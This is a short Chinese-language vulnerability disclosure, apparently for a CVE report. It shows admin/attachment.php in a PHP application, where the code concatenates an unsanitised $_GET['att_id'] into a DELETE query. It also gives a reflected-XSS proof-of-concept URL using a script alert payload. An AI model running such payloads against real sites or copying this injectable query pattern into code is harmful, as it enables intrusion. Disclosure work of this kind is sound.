首先在admin目录下面可以看见attachment.php里面加载了很多功能，我们发现del功能以$_REQUEST函数来指定变量act=del
![1](https://github.com/ysl1415926/cve/assets/138963581/9782bd47-91d3-44b8-aace-6740ffb7c20a)
![2](https://github.com/ysl1415926/cve/assets/138963581/de1ff1ab-497e-4216-aa35-a2af91daa13b)

` elseif($_REQUEST['act'] == 'del')
 {
 	$sql = "DELETE FROM ".table('attachment')." WHERE att_id = ".$_GET['att_id'];
 	if(!$db->query($sql)){
 		showmsg('删除附加属性出错', true);
 	}
 	showmsg('删除附加属性成功','attachment.php', true);
 }`

然后在下面代码中看见一个sql语句以GET方式传递了一个att_id参数

![3](https://github.com/ysl1415926/cve/assets/138963581/7ba28355-00d6-412e-ac11-b03486d0a7c8)


`$sql = "DELETE FROM ".table('attachment')." WHERE att_id = ".$_GET['att_id'];`

当时本来是测试sql注入，但是他下面一行会打印出出错信息

![4](https://github.com/ysl1415926/cve/assets/138963581/b4b79073-de8f-41d9-b42d-58bcf171f1cd)


这样我们就可以利用错误参数实现XSS攻击

![5](https://github.com/ysl1415926/cve/assets/138963581/999237dd-4d5f-42aa-af8c-7220c232c3e0)


`if(!$db->query($sql)){
 		showmsg('删除附加属性出错', true);
 	}
 	showmsg('删除附加属性成功','attachment.php', true);`

在本地搭建后，测试成功
poc：/admin/attachment.php?act=del&att_id=<script>alert(1)</script>

![6](https://github.com/ysl1415926/cve/assets/138963581/3283a4d5-8562-4db1-bedf-1b4989270033)
